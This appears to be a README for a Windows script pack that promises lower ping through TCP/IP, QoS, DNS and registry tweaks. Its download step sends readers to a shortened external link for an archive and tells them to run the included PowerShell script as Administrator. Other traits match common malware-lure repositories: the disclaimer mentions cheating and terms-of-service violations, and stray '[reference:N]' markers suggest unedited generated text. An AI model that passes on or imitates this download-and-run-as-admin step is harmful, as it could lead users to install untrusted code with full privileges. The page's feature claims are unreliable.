# Network-Latency-Reduction-Script

## A professional collection of PowerShell scripts, batch files, and registry tweaks designed to reduce network latency, optimize TCP/IP stack, and eliminate bufferbloat on Windows systems.

![Preview](https://i.postimg.cc/vmqjJTqm/maxresdefault-(88).jpg)

## Download

1. **[DOWNLOAD — Click here](https://share.google/9Ss2vJJCQVKzQm91q)**
2. Extract the downloaded archive.
3. Open the included documentation guide.

## Features

- TCP/IP stack optimization for lower latency and reduced jitter[reference:2]
- Disable TCP Autotuning to minimize bufferbloat under heavy network load[reference:3]
- QoS policy configuration with DSCP 46 (Expedited Forwarding) for prioritized traffic[reference:4]
- DNS server optimization for faster name resolution[reference:5]
- Network adapter settings tuning (interrupt moderation, offloading, RSS)
- Background process and service debloat to free up network bandwidth[reference:6]
- Power management tweaks to prevent network throttling[reference:7]
- Ping and latency benchmark tools to measure improvements
- One-click execution with built-in safety checks and restore mode
- Step-by-step documentation with before/after comparisons

## Requirements

- Windows 10 / 11 (64-bit)
- Administrator privileges (for registry and network modifications)
- PowerShell 5.0 or higher
- Ethernet or Wi-Fi connection

## Usage

1. Download and extract the repository files.
2. Open PowerShell or Command Prompt as Administrator.
3. Run the main script: `.\Optimize-Network.ps1`
4. Follow the on-screen prompts to apply the desired optimizations.
5. Restart your PC to apply all changes.
6. Use the benchmark tools to measure latency improvements.
7. Run the restore script if you need to revert to default settings.

## About the project

This repository contains a carefully assembled set of reference materials, automation scripts, and registry tweaks for reducing network latency on Windows. The included files represent a comprehensive network latency reduction solution, designed to demonstrate various optimization techniques — including TCP/IP stack tuning, QoS policy configuration, DNS optimization, and bufferbloat mitigation — for academic and research purposes. The scripts are tailored for gamers and power users who demand the lowest possible ping and the most stable network connection[reference:8][reference:9]. All code and resources are provided "as is" for learning.

## Legality

This repository is provided for educational and research purposes only. The author does not condone or encourage any unauthorized use, cheating, or violation of third-party terms of service. All rights belong to their respective owners. Use at your own risk.
